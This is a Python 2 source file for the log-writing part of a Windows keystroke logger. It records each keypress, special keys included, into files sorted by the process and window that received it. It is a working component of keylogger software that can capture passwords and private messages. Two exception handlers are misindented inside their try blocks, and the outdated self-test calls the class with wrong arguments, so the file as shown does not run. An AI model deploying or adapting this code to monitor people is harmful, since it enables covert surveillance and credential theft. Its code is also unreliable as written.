import win32api, win32con, win32process
import os, os.path
import time
import re
import sys


class LogWriter:

    def __init__(self, options):
        
        self.options = options
        
        self.options.dirName = os.path.normpath(self.options.dirName)
        
        try:
            os.makedirs(self.options.dirName, 0777) 
        except OSError, detail:
            if(detail.errno==17):  #if directory already exists, swallow the error
                pass
            else:
                self.PrintDebug(sys.exc_info()[0] + ", " + sys.exc_info()[1] + "\n")
        except:
            self.PrintDebug("Unexpected error: " + sys.exc_info()[0] + ", " + sys.exc_info()[1] + "\n")
        
        self.filter = re.compile(r"[\\\/\:\*\?\"\<\>\|]+")      #regexp filter for the non-allowed characters in windows filenames.
        
        self.writeTarget = ""
        if self.options.systemLog != None:
            try:
                self.systemlog = open(os.path.join(self.options.dirName, self.options.systemLog), 'a')
            except OSError, detail:
                if(detail.errno==17):  #if file already exists, swallow the error
                    pass
                else:
                    self.PrintDebug(sys.exc_info()[0] + ", " + sys.exc_info()[1] + "\n")
            except:
                self.PrintDebug("Unexpected error: " + sys.exc_info()[0] + ", " + sys.exc_info()[1] + "\n")

        
        #~ if not self.options.debug:      #if we are not running debug and thus can see console, let's redirect stderr to errorlog.
            #~ self.errorlog = open(os.path.join(self.options.dirName, "errorlog.txt"), 'a')
            #~ self.savestderr = sys.stderr    #save stderr just in case we want to restore it later
            #~ sys.stderr = self.errorlog
            

    def WriteToLogFile(self, event):
        loggable = self.TestForNoLog(event)
                
        if not loggable:                        # if the program is in the no-log list, we return without writing to log.
            if self.options.debug: self.PrintDebug("not loggable, we are outta here\n")
            return
        
        if self.options.debug: self.PrintDebug("loggable, lets log it\n")
        
        loggable = self.OpenLogFile(event)
        if not loggable:
            self.PrintDebug("some error occurred when opening the log file. we cannot log this event. check systemlog (if specified) for details.\n")
            return

        asciiSubset = [8,9,10,13,27]           #backspace, tab, line feed, carriage return, escape
        asciiSubset.extend(range(32,128))      #all normal printable chars
        
        if self.options.parseBackspace == True:
            asciiSubset.remove(8)              #remove backspace from allowed chars if needed
        if self.options.parseEscape == True:
            asciiSubset.remove(27)             #remove escape from allowed chars if needed

        if event.Ascii in asciiSubset:
            self.PrintStuff(chr(event.Ascii))
        if event.Ascii == 13 and self.options.addLineFeed == True:
            self.PrintStuff(chr(10))                 #add line feed after CR,if option is set
            
        #we translate all the special keys, such as arrows, backspace, into text strings for logging
        #exclude shift keys, because they are already represented (as capital letters/symbols)
        if event.Ascii == 0 and not (str(event.Key).endswith('shift') or str(event.Key).endswith('Capital')):
            self.PrintStuff('[KeyName:' + event.Key + ']')
        
        #translate backspace into text string, if option is set.
        if event.Ascii == 8 and self.options.parseBackspace == True:
            self.PrintStuff('[KeyName:' + event.Key + ']')
        
        #translate escape into text string, if option is set.
        if event.Ascii == 27 and self.options.parseEscape == True:
            self.PrintStuff('[KeyName:' + event.Key + ']')

        if event.Key == self.options.flushKey:
            self.log.flush()
            if self.options.systemLog != None: self.systemlog.flush()

    def TestForNoLog(self, event):
        '''This function returns False if the process name associated with an event
        is listed in the noLog option, and True otherwise.'''
        
        self.processName = self.GetProcessNameFromHwnd(event.Window)
        if self.options.noLog != None:
            for path in self.options.noLog:
                if os.stat(path) == os.stat(self.processName):    #we use os.stat instead of comparing strings due to multiple possible representations of a path
                    return False
        return True

    def OpenLogFile(self, event):
        
        if self.options.oneFile != None:
            if self.writeTarget == "":
                self.writeTarget = os.path.join(os.path.normpath(self.options.dirName), os.path.normpath(self.options.oneFile))
                try:
                    self.log = open(self.writeTarget, 'a')
                except OSError, detail:
                    if(detail.errno==17):  #if file already exists, swallow the error
                        pass
                    else:
                        self.PrintDebug(sys.exc_info()[0] + ", " + sys.exc_info()[1] + "\n")
                        return False
                except:
                    self.PrintDebug("Unexpected error: " + sys.exc_info()[0] + ", " + sys.exc_info()[1] + "\n")
                    return False

                self.PrintDebug("writing to: " + self.writeTarget + "\n")
            return

        subDirName = self.filter.sub(r'__',self.processName)      #our subdirname is the full path of the process owning the hwnd, filtered.
        
        WindowName = self.filter.sub(r'__',str(event.WindowName))
        
        try:
            os.makedirs(os.path.join(self.options.dirName, subDirName), 0777)
            except OSError, detail:
                if(detail.errno==17):  #if directory already exists, swallow the error
                    pass
                else:
                    self.PrintDebug(sys.exc_info()[0] + ", " + sys.exc_info()[1] + "\n")
                    return False
            except:
                self.PrintDebug("Unexpected error: " + sys.exc_info()[0] + ", " + sys.exc_info()[1] + "\n")
                return False
    
        filename = time.strftime('%Y%m%d') + "_" + str(event.Window) + "_" + WindowName
        
        #make sure our filename plus path is not longer than 255 characters, as per filesystem limit.
        #filename = filename[0:200] + ".txt"     
        if len(os.path.join(self.options.dirName, subDirName, filename)) > 255:
            if len(os.path.join(self.options.dirName, subDirName)) > 250:
                self.PrintDebug("root log dir + subdirname is longer than 250. cannot log.")
                return False
            else:
                filename = filename[0:255-len(os.path.join(self.options.dirName, subDirName))-4] + ".txt"  
        

        #we do this writetarget thing to make sure we dont keep opening and closing the log file when all inputs are going
        #into the same log file. so, when our new writetarget is the same as the previous one, we just write to the same 
        #already-opened file.
        if self.writeTarget != os.path.join(self.options.dirName, subDirName, filename): 
            if self.writeTarget != "":
                self.PrintDebug("flushing and closing old log\n")
                self.log.flush()
                self.log.close()
            self.writeTarget = os.path.join(self.options.dirName, subDirName, filename)
            self.PrintDebug("writeTarget:" + self.writeTarget + "\n")
            
            try:
                self.log = open(self.writeTarget, 'a')
                except OSError, detail:
                    if(detail.errno==17):  #if file already exists, swallow the error
                        pass
                    else:
                        self.PrintDebug(sys.exc_info()[0] + ", " + sys.exc_info()[1] + "\n")
                        return False
                except:
                    self.PrintDebug("Unexpected error: " + sys.exc_info()[0] + ", " + sys.exc_info()[1] + "\n")
                    return False
        
        return True

    def PrintStuff(self, stuff):
        if not self.options.debug:
            self.log.write(stuff)
        else:
            sys.stdout.write(stuff)
        if self.options.systemLog != None:
            self.systemlog.write(stuff)

    def PrintDebug(self, stuff):
        if self.options.debug:
            sys.stdout.write(stuff)
        if self.options.systemLog != None:
            self.systemlog.write(stuff)

    def GetProcessNameFromHwnd(self, hwnd):
    
        threadpid, procpid = win32process.GetWindowThreadProcessId(hwnd)
        
        # PROCESS_QUERY_INFORMATION (0x0400) or PROCESS_VM_READ (0x0010) or PROCESS_ALL_ACCESS (0x1F0FFF)
        
        mypyproc = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, procpid)
        procname = win32process.GetModuleFileNameEx(mypyproc, 0)
        return procname


if __name__ == '__main__':
    #some testing code
    #put a real existing hwnd into event.Window to run test
    #this testing code is now outdated.
    lw = LogWriter()
    class Blank:
        pass
    event = Blank()
    event.Window = 264854
    event.WindowName = "Untitled - Notepad"
    event.Ascii = 65
    event.Key = 'A'
    options = Blank()
    options.parseBackspace = options.parseEscape = options.addLineFeed = options.debug = False
    options.flushKey = 'F12'
    lw.WriteToLogFile(event, options)
    
